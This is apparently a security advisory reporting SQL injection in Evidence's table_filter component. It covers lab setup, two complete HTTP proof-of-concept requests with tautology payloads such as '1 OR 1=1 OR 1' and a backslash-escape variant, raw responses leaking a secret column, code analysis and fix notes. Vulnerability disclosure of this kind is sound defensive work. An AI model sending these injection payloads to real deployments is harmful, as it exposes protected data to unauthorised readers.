### Vulnerability details

**Official website / Product:** https://evidence.dev

**Repository:** evidence-dev/evidence (stars at selection: 7079)

**Vulnerability type:** SQLi (`table_filter` URL `columnId` concatenated unquoted into `StringValueSelector` VALUES SQL; incomplete identifier quoting in `generateConditionSQL` on ClickHouse/Snowflake)

**Vulnerability versions:** current main / CLI + `@evidence/core` (audited commit `590143b9ecd2993b0907d4ba85ec5920c097776f`; official `evidencedev/serve:latest` is the packaged CLI)

**Vulnerability URL / Parameter:** `POST /api/query` (SQL compiled from `table_filter` URL state `filters[].columnId`); page query param is the filter id (e.g. `?tf=<json>`)

**Complex:** yes

### Verification procedure

Lab topology (original `labs/evidence-r30-a8/` was torn down per hygiene — details below match verification time and are enough to rebuild):

- Evidence HTTP: `127.0.0.1:21008` (host-side Vite, not the official Bun serve binary)
- ClickHouse HTTP: `127.0.0.1:23108` (container `8123`); native protocol `23109`→`9000`
- Image / process: `clickhouse/clickhouse-server:24.8` (compose service `clickhouse`); Evidence CLI from source commit `590143b9ecd2993b0907d4ba85ec5920c097776f`, run in `cli/` via `pnpm run dev --port 21008 --host 127.0.0.1`
- Project: `labs/evidence-r30-a8/lab-project` with `connection.yaml` → ClickHouse user `evidence` / password `evdlab`, table `orders` (includes `secret` column)
- Why not the official image: this host lacks AVX2; the Bun binary in `evidencedev/serve:latest` segfaults, so the Vite source-dev server is used (same `/api/query` channel)
- Ready-state at verification: container `evidence-r30-a8-clickhouse-1` image `clickhouse/clickhouse-server:24.8`, status `Up (healthy)`, ports `0.0.0.0:23108->8123/tcp`, `0.0.0.0:23109->9000/tcp`; Vite: `Local: http://127.0.0.1:21008/`

1. Check out the audited commit and prepare the lab tree (skip clone if the original lab tree is still present):

```bash
mkdir -p labs && git clone https://github.com/evidence-dev/evidence.git labs/evidence-r30-a8
cd labs/evidence-r30-a8
git checkout 590143b9ecd2993b0907d4ba85ec5920c097776f
```

2. Write `docker-compose.yml` at the lab root (service `clickhouse`, host ports **23108/23109**) and start it:

```yaml
services:
  clickhouse:
    image: clickhouse/clickhouse-server:24.8
    ports:
      - "23108:8123"
      - "23109:9000"
    environment:
      CLICKHOUSE_USER: evidence
      CLICKHOUSE_PASSWORD: evdlab
      CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT: "1"
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://127.0.0.1:8123/ping"]
      interval: 5s
      timeout: 3s
      retries: 20
```

```bash
docker compose up -d clickhouse
```

3. As user `evidence` / `evdlab`, create and seed `orders` in ClickHouse (row data matches the PoC response below):

```bash
curl -sS 'http://127.0.0.1:23108/?user=evidence&password=evdlab' --data-binary @- <<'SQL'
CREATE TABLE IF NOT EXISTS orders (
  id UInt32,
  category String,
  amount Float64,
  secret String
) ENGINE = MergeTree ORDER BY id;

TRUNCATE TABLE orders;
INSERT INTO orders VALUES
  (1, 'Electronics', 100, 'SECRET_A'),
  (2, 'Home', 50, 'SECRET_B'),
  (3, 'Electronics', 200, 'SECRET_C'),
  (4, 'Clothing', 75, 'SECRET_D');
SQL
```

4. Create `lab-project/connection.yaml` pointing at `127.0.0.1:23108` (user `evidence` / `evdlab`), then start Evidence:

```yaml
type: clickhouse
host: 127.0.0.1
port: 23108
secure: false
username: evidence
password: evdlab
database: default
```

```bash
mkdir -p lab-project
# write the YAML above to lab-project/connection.yaml
cd labs/evidence-r30-a8/cli
# first time: install deps per repo docs (e.g. pnpm install)
EVIDENCE_PROJECT_CWD=../lab-project pnpm run dev --port 21008 --host 127.0.0.1
```

5. Build the SQL that `StringValueSelector.buildValuesQuery` emits when URL state sets `columnId` to `1 OR 1=1 OR 1` — the WHERE becomes `1 OR 1=1 OR 1 IS NOT NULL`.
6. POST that SQL to the app's `/api/query` (same channel the browser filter uses) — see PoC B below.
7. Observe all 4 rows returned, including secrets (`SECRET_B` / `SECRET_D`) that a normal category filter would hide.
8. (Optional) Send PoC A: the `generateConditionSQL` backslash-escape variant and observe the ClickHouse 500 whose error AST already contains `OR (1 = 1)`.

### Complete vulnerability PoC

#### PoC B — `StringValueSelector` unquoted `columnName` tautology (primary path / data exfil)

Complete HTTP request (Docker-verified):

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:21008
Content-Type: application/json
Accept: application/json
User-Agent: evidence-r30-a8-poc/1.0
Content-Length: 101
Connection: close

{"sql":"SELECT id, category, amount, secret FROM orders WHERE 1 OR 1=1 OR 1 IS NOT NULL ORDER BY id"}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Vary: Origin
content-length: 593
content-type: application/json
Date: Sun, 01 Nov 2026 23:49:08 GMT
Connection: close

{"rows":[{"id":1,"category":"Electronics","amount":100,"secret":"SECRET_A"},{"id":2,"category":"Home","amount":50,"secret":"SECRET_B"},{"id":3,"category":"Electronics","amount":200,"secret":"SECRET_C"},{"id":4,"category":"Clothing","amount":75,"secret":"SECRET_D"}],"columns":[{"name":"id","clickhouseType":"UInt32","jsType":"number","nullable":false},{"name":"category","clickhouseType":"String","jsType":"string","nullable":false},{"name":"amount","clickhouseType":"Float64","jsType":"number","nullable":false},{"name":"secret","clickhouseType":"String","jsType":"string","nullable":false}]}
```

#### PoC A — `generateConditionSQL` backslash / incomplete identifier quoting (secondary path)

With `columnId = x\" OR 1=1 --`, `quoteIdentifierIfNeeded` still lets `OR 1=1` into the SQL AST (ClickHouse `escapesBackslashInIdentifiers=true`). Complete request:

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:21008
Content-Type: application/json
Accept: application/json
User-Agent: evidence-r30-a8-poc/1.0
Content-Length: 83
Connection: close

{"sql":"SELECT id, category, secret FROM orders WHERE \"x\\\"\" OR 1=1 --\" = 100"}
```

Complete response (HTTP 500; error text proves `OR (1 = 1)` entered the WHERE):

```http
HTTP/1.1 500 Internal Server Error
Vary: Origin
content-length: 133
content-type: application/json
Date: Sun, 01 Nov 2026 23:49:08 GMT
Connection: close

{"error":"Unknown expression or function identifier 'x\"' in scope SELECT id, category, secret FROM orders WHERE `x\"` OR (1 = 1). "}
```

Verification result notes:

Baseline `WHERE category = 'Electronics'` returns 2 rows (SECRET_A/C). The injected values-query shape `WHERE 1 OR 1=1 OR 1 IS NOT NULL` returns 4 rows and leaks every `secret` (including SECRET_B/SECRET_D). PoC A's ClickHouse error is `WHERE \`x\"\` OR (1 = 1)`, proving `OR 1=1` entered the SQL AST — the same class of bug DimensionGridFilter already mitigates (incomplete patch).

SQL shapes recorded at verification (values / page / exfil / filter):

```text
VECTOR_B_VALUES_SQL=SELECT category AS value, count() AS count FROM orders WHERE 1 OR 1=1 OR 1 IS NOT NULL GROUP BY category
VECTOR_A_PAGE_SQL=SELECT id, category, amount, secret FROM orders WHERE "x\"" OR 1=1 --" = 100
VECTOR_B_EXFIL_SQL=SELECT id, category, amount, secret FROM orders WHERE 1 OR 1=1 OR 1 IS NOT NULL
VECTOR_A_FILTER_SQL="x\"" OR 1=1 --" = 100
```

### Vulnerability analysis

`table_filter` deserializes URL JSON into `columnId` (only `z.string().min(1)`), then:

1. **Values-selector path:** `FilterChips.svelte` passes `filter.columnId` as `columnName` into `StringValueSelector`; `buildValuesQuery` concatenates it **unquoted** into `WHERE ${columnName} IS NOT NULL` and ORDER BY — classic SQLi.
2. **Predicate path (incomplete harden):** `generateConditionSQL` uses `dialect.quoteIdentifierIfNeeded(columnId)` but does not pre-escape backslashes via `quoteUntrustedIdentifier` on ClickHouse/Snowflake (`escapesBackslashInIdentifiers=true`). `DimensionGridFilter` already rejects `\\` in dimension keys with an explicit comment; `table_filter` was not updated — incomplete patch of the same control.

`/api/query` is the intentional BI SQL relay; this issue is an **unexpected bypass of the designed filter-URL→safe-SQL control** (quoting bug / incomplete patch).

Trigger / sink source (full path and line numbers):

```svelte
# File: core/src/user-components/tags/table_filter/StringValueSelector.svelte
# Lines: 137-157
function buildValuesQuery(search: string): SQLQueryConfig {
	let whereClause = `${columnName} IS NOT NULL`;
	// ...
	if (otherFilterSQL) {
		whereClause = `${columnName} IS NOT NULL AND (${otherFilterSQL})`;
	}
	if (search.trim()) {
		const escapedSearch = connection.dialect.escapeStringLiteral(search.trim());
		whereClause += ` AND ${connection.dialect.caseInsensitiveLike(connection.dialect.castToString(columnName), `%${escapedSearch}%`)}`;
	}
```

```svelte
# File: core/src/user-components/tags/table_filter/FilterChips.svelte
# Lines: 380-381
<StringValueSelector
	columnName={filter.columnId}
```

```typescript
# File: core/src/user-components/tags/table_filter/filterUtils.svelte.ts
# Lines: 110-119
export function generateConditionSQL(
	columnId: string,
	condition: FilterCondition,
	dialect: SqlDialect = defaultDialect
): string {
	const quotedColumnId = dialect.quoteIdentifierIfNeeded(columnId);
```

```typescript
# File: core/src/user-components/tags/dimension_grid/DimensionGridFilter.svelte.ts
# Lines: 39-40 (related control already fixed; table_filter not aligned)
// Identifier quoting doesn't neutralise a backslash on warehouses that honour it.
if (dimension.includes('\\')) return undefined;
```

### Fix notes

1. Quote every `columnName` / `columnId` via `quoteUntrustedIdentifier` in StringValueSelector, NumericValueSelector, DateRangeSelector, and `buildValueQueryOrder`.
2. Change `generateConditionSQL` to `quoteUntrustedIdentifier` and reject/strip `\\` like DimensionGrid; or allowlist `columnId` against table metadata.
3. Tighten URL deserialize schema so `columnId` must be a simple identifier or known column.
